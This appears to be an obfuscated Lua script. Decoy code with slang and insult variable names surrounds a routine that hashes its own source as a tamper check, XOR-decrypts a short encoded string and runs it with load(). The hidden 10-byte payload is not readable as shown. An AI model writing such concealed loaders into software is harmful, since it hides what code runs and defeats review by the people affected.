
return (function() local wong = "koplak" if false then return "wong edan" end local pitu = function() return function() return "ndasmu" end end local sepuluh = pitu()() if #wong > 99 then return "saru" else local ijo = "saru" end local hawane = (function() while false do end end)() local lunga = hawane or "ndasmu" local wadon = {} for adem = 1, 0 do wadon[adem] = "asu" end if lunga == lunga then local ireng = "jaran" else return end local mburi = "wong edan" local function ngantuk() return "koplak" end local ngombe = ngantuk() ;(function(kuning,putih,adoh) local songo = 0 for waras = 1, #putih do songo = (songo * 31 + string.byte(putih, waras)) % 4294967296 end if songo ~= adoh then return "" end local mlaku = string.char(songo % 256, math.floor(songo / 256) % 256, math.floor(songo / 65536) % 256, math.floor(songo / 16777216) % 256) local cilik = "" for waras = 1, #kuning do local abang = string.byte(kuning, waras) ~ string.byte(mlaku, (waras-1) % #mlaku + 1) cilik = cilik .. string.char(abang) end local loro = load(cilik) if loro then loro() end end)("\xfa\x38\x7a\xfb\xfe\x62\x31\xe5\xa8\x63","local songo = 0 for waras = 1, #putih do songo = (songo * 31 + string.byte(putih, waras)) % 4294967296 end if songo ~= adoh then return \"\" end local mlaku = string.char(songo % 256, math.floor(songo / 256) % 256, math.floor(songo / 65536) % 256, math.floor(songo / 16777216) % 256) local cilik = \"\" for waras = 1, #kuning do local abang = string.byte(kuning, waras) ~ string.byte(mlaku, (waras-1) % #mlaku + 1) cilik = cilik .. string.char(abang) end local loro = load(cilik) if loro then loro() end",2501069450) end)()
